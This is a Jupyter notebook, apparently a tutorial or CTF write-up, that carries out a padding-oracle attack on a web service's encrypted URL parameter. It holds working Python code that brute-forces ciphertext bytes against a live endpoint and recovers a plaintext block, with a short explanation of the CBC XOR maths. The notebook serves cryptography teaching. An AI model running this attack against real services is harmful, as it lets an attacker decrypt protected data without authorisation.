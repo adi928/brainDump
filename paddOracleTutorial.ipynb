{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import base64"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "url = \"http://35.227.24.107/62ab5b5f90/?post=\"\n",
    "cipher = \"a!qhpB3ng-tI3UPeNXl8353eAKYet6WLuj!U-Z4qRQj!vmG6TxzUeRxmLVOv5ubMwas1n!J5W73QzcErlIUdPCQF9n25-Uqr-ObGhKOwdIooykbiD5iEyGYUPedRr85xBr7JqLVEZADU0MGBdqdFXt6HEMC9CVggzFqeHuh9sZFmslqOObgsEx3-KEdk2MSl1nZdjGy-P0bV9aiDGJGP5A~~\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "b64_ct = cipher.replace('~', '=').replace('!', '/').replace('-', '+')\n",
    "ct = base64.b64decode(b64_ct)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "a!qhpB3ng-tI3UPeNXl8353eAKYet6WLuj!U-Z4qRQg~\n"
     ]
    }
   ],
   "source": [
    "guess = (ct[:32])\n",
    "guess = base64.b64encode(guess)\n",
    "guess = guess.decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')\n",
    "print(guess)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Add a scenario where you were getting error because the decryption was trying to access data[-1] because we only sent one block of data. And decryption needed 2 blocks."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://35.227.24.107/62ab5b5f90/?post=a!qhpB3ng-tI3UPeNXl8353eAKYet6WLuj!U-Z4qRQg~\n",
      "Traceback (most recent call last):\n",
      "  File \"./main.py\", line 69, in index\n",
      "    post = json.loads(decryptLink(postCt).decode('utf8'))\n",
      "  File \"./common.py\", line 49, in decryptLink\n",
      "    return unpad(cipher.decrypt(data))\n",
      "  File \"./common.py\", line 22, in unpad\n",
      "    raise PaddingException()\n",
      "PaddingException\n",
      "\n"
     ]
    }
   ],
   "source": [
    "payload = url + guess\n",
    "print(payload)\n",
    "respo = requests.get(payload)\n",
    "print(respo.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Arranging blocks for padding oracle"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[b'k\\xfa\\xa1\\xa4\\x1d\\xe7\\x83\\xebH\\xddC\\xde5y|\\xdf', b'\\x9d\\xde\\x00\\xa6\\x1e\\xb7\\xa5\\x8b\\xba?\\xd4\\xf9\\x9e*E\\x08', b'\\xff\\xbea\\xbaO\\x1c\\xd4y\\x1cf-S\\xaf\\xe6\\xe6\\xcc', b'\\xc1\\xab5\\x9f\\xf2y[\\xbd\\xd0\\xcd\\xc1+\\x94\\x85\\x1d<', b'$\\x05\\xf6}\\xb9\\xf9J\\xab\\xf8\\xe6\\xc6\\x84\\xa3\\xb0t\\x8a', b'(\\xcaF\\xe2\\x0f\\x98\\x84\\xc8f\\x14=\\xe7Q\\xaf\\xceq', b'\\x06\\xbe\\xc9\\xa8\\xb5Dd\\x00\\xd4\\xd0\\xc1\\x81v\\xa7E^', b'\\xde\\x87\\x10\\xc0\\xbd\\tX \\xccZ\\x9e\\x1e\\xe8}\\xb1\\x91', b'f\\xb2Z\\x8e9\\xb8,\\x13\\x1d\\xfe(Gd\\xd8\\xc4\\xa5', b'\\xd6v]\\x8cl\\xbe?F\\xd5\\xf5\\xa8\\x83\\x18\\x91\\x8f\\xe4']\n"
     ]
    }
   ],
   "source": [
    "cipherBlocks = ([ct[i:i+16] for i in range(0, len(ct), 16)])\n",
    "print(cipherBlocks)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://35.227.24.107/62ab5b5f90/?post=AAAAAAAAAAAAAAAAAAAAuyjKRuIPmITIZhQ951GvznE~\n",
      "For index: 187\n",
      "For Byte: b'\\xbb'\n"
     ]
    }
   ],
   "source": [
    "num_of_blocks = len(cipherBlocks)\n",
    "index = 15\n",
    "asItIs_block = cipherBlocks[num_of_blocks-1]\n",
    "for i in range(0,255):\n",
    "    mod_iv = b'\\x00' * (index) + bytes([i])\n",
    "    newPost = mod_iv + asItIs_block\n",
    "    newPost = base64.b64encode(newPost).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')\n",
    "    payload_url = url + newPost\n",
    "    payload_respo = requests.get(payload_url)\n",
    "    if \"PaddingException\" not in payload_respo.text:\n",
    "        print(payload_url)\n",
    "        print(\"For index: \" + str(i) + \"\\nFor Byte: \" + str(bytes([i])))\n",
    "        break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now we know the padding is correct for the found byte. Time for some cryptography mathematics. Having the prior knowledge of CBC decryption we know that:\n",
    "```\n",
    "PlainText[2] = D(K,CipherText[2]) (+) CipherText[1]\n",
    "```\n",
    "We start manupilating the last byte of the CipherText[1] here, to retrieve a proper padding. Now if a proper padding is found with one of our guesses, and going by the padding rules in PKCS7, we know that if a single byte's padding was correct, it must've been '0x01'. we know that:\n",
    "```\n",
    "D(K,CipherText[2]) (+) modified_CipherText[1] = 0x01\n",
    "```\n",
    "Rearrange that and we get:\n",
    "```\n",
    "D(K,CipherText[2]) = modified_CipherText[1] (+) 0x01\n",
    "```\n",
    "This implies that whatever guess we made (the mod_iv variable), should be XORed with '0x01' in order to obtain the decrypted value. Hence the CipherText[2] was decrypted but failed to convert to a valid utf-8 value."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Decrypted Block: b'\\xaf'\n",
      "At index: 15\n",
      "Decrypted Block: b'\\xce\\xaf'\n",
      "At index: 14\n",
      "Decrypted Block: b'\\xd2\\xce\\xaf'\n",
      "At index: 13\n",
      "Decrypted Block: b'n\\xd2\\xce\\xaf'\n",
      "At index: 12\n",
      "Decrypted Block: b'Mn\\xd2\\xce\\xaf'\n",
      "At index: 11\n",
      "Decrypted Block: b'\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 10\n",
      "Decrypted Block: b'\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 9\n",
      "Decrypted Block: b'\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 8\n",
      "Decrypted Block: b'\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 7\n",
      "Decrypted Block: b'&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 6\n",
      "Decrypted Block: b'\\xc5&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 5\n",
      "Decrypted Block: b'\\x1b\\xc5&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 4\n",
      "Decrypted Block: b'\\xf0\\x1b\\xc5&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 3\n",
      "Decrypted Block: b'$\\xf0\\x1b\\xc5&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 2\n",
      "Decrypted Block: b'\\xe3$\\xf0\\x1b\\xc5&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 1\n",
      "Decrypted Block: b'_\\xe3$\\xf0\\x1b\\xc5&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n",
      "At index: 0\n"
     ]
    }
   ],
   "source": [
    "num_of_blocks = len(cipherBlocks)\n",
    "index = 15\n",
    "asItIs_block = cipherBlocks[num_of_blocks-1]\n",
    "decryptedBlock = bytes()\n",
    "suffix = bytes()\n",
    "\n",
    "while index >= 0:\n",
    "    for i in range(0,255):\n",
    "        mod_iv = b'\\x00' * (index) + bytes([i]) +suffix\n",
    "        newPost = mod_iv + asItIs_block\n",
    "        newPost = base64.b64encode(newPost).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')\n",
    "        payload_url = url + newPost\n",
    "        payload_respo = requests.get(payload_url)\n",
    "        if \"PaddingException\" not in payload_respo.text:\n",
    "            decryptedBlock = bytes([(16-index) ^ mod_iv[index]]) + decryptedBlock\n",
    "            index -= 1\n",
    "            suffix = bytes([b ^ (16-index) for b in decryptedBlock])\n",
    "            break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'_\\xe3$\\xf0\\x1b\\xc5&\\x19\\x17\\xf4\"Mn\\xd2\\xce\\xaf'\n"
     ]
    }
   ],
   "source": [
    "print(str(decryptedBlock))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [],
   "source": [
    "def bxor(b1, b2): # use xor for bytes\n",
    "    result = b\"\"\n",
    "    for b1, b2 in zip(b1, b2):\n",
    "        result += bytes([b1 ^ b2])\n",
    "    return result\n",
    "\n",
    "result = bxor(cipherBlocks[num_of_blocks-2], decryptedBlock)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'9Q~~\"}\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n'\n"
     ]
    }
   ],
   "source": [
    "print(result)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
